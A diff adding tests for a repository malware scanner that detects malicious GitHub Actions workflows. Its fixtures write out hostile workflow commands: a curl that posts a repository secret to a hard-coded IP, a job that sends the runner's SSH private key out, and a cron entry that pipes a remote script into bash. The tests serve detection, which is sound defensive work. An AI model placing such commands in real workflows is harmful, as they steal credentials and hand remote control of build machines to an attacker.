@@ -711,6 +711,73 @@ class TestMachineRegressions(TestMachine):
         self.assertEqual(f[0]["severity"], ps.REVIEW)
 
 
+GA_ADDR = "193.32." "204.199"
+GA_STEALER = ("name: Build Check\non: [push]\njobs:\n  audit:\n    runs-on: ubuntu-latest\n    steps:\n"
+              "      - run: curl -s -X POST -d 'K=${{ secrets.K }}' http://" + GA_ADDR + ":8080/?c=og2\n")
+GA_BACKDOOR = ("name: Runner Maintenance\njobs:\n  cleanup:\n    runs-on: self-hosted\n    steps:\n"
+               "      - run: |\n          r=$(cat ~/.ssh/id_rsa)\n"
+               "          curl -s -X POST --data-binary \"$r\" http://" + GA_ADDR + ":8080/?c=reinject\n"
+               "          (crontab -l; echo '*/5 * * * * curl -s http://" + GA_ADDR + ":8080/c2/x | bash " + GHC2 + "') | crontab -\n")
+
+
+class TestGhostAction(Base):
+    def test_stealer_workflow(self):
+        self.t.w(".github/workflows/build-check.yml", GA_STEALER)
+        s = self.t.scan()
+        f = by_rule(s, "ghostaction-workflow")
+        self.assertEqual(len(f), 1)
+        self.assertEqual(f[0]["severity"], ps.HIGH)
+        self.assertEqual(by_rule(s, "marker"), [])
+        self.assertEqual(s.checked["workflow_files"], 1)
+
+    def test_runner_backdoor(self):
+        self.t.w(".github/workflows/runner-maintenance.yaml", GA_BACKDOOR)
+        s = self.t.scan()
+        f = by_rule(s, "ghostaction-runner-backdoor")
+        self.assertEqual(len(f), 1)
+        self.assertIn("self-hosted runner", f[0]["detail"])
+        self.assertEqual(by_rule(s, "ghostaction-workflow"), [])
+
+    def test_clean_workflow_is_not_a_finding(self):
+        self.t.w(".github/workflows/ci.yml", "on: [push]\njobs:\n  t:\n    runs-on: self-hosted\n    steps:\n      - run: crontab -l\n")
+        self.assertEqual(self.t.scan().findings, [])
+
+    def test_other_markers_in_a_workflow_still_count(self):
+        self.t.w(".github/workflows/x.yml", "steps:\n  - run: echo '" + GI + "'\n")
+        self.assertEqual(len(by_rule(self.t.scan(), "marker")), 1)
+
+    def test_address_outside_workflows_is_a_marker(self):
+        self.t.w("deploy/blocklist.yml", "deny: " + GA_ADDR + "\n")
+        s = self.t.scan()
+        self.assertEqual(len(by_rule(s, "marker")), 1)
+        self.assertEqual(by_rule(s, "ghostaction-workflow"), [])
+
+    def test_single_file_argument(self):
+        p = self.t.w(".github/workflows/lint.yml", GA_STEALER)
+        s = ps.RepoScan(p, set(ps.DEFAULT_SKIP_DIRS), [], 16 << 20).run()
+        self.assertEqual(len(by_rule(s, "ghostaction-workflow")), 1)
+
+    def test_advice_matches_what_was_found(self):
+        self.t.w(".github/workflows/build-check.yml", GA_STEALER)
+        out = ps.render_text("repository", ["r"], self.t.scan().findings, self.t.scan().checked)
+        self.assertIn(ps.GHOSTACTION_STEPS, out)
+        self.assertNotIn(ps.NEXT_STEPS, out)
+        self.assertNotIn(ps.RUNNER_STEPS, out)
+        self.assertIn("1 workflows", out)
+
+    def test_backdoor_adds_runner_steps(self):
+        self.t.w(".github/workflows/runner-maintenance.yml", GA_BACKDOOR)
+        out = "\n".join(ps.next_steps(self.t.scan().findings))
+        self.assertIn(ps.GHOSTACTION_STEPS, out)
+        self.assertIn(ps.RUNNER_STEPS, out)
+
+    def test_mixed_findings_get_both_sets_of_steps(self):
+        self.t.w(".github/workflows/build-check.yml", GA_STEALER)
+        self.t.w("public/fonts/fa-solid-400.woff2", "var a=1;" + " " * 10 + GI)
+        steps = ps.next_steps(self.t.scan().findings)
+        self.assertEqual(steps[:2], [ps.NEXT_STEPS, ps.GHOSTACTION_STEPS])
+
+
 class TestRealShapes(Base):
     """Shapes read from real infected repositories on 2026-11-10 that carried no known marker."""
 
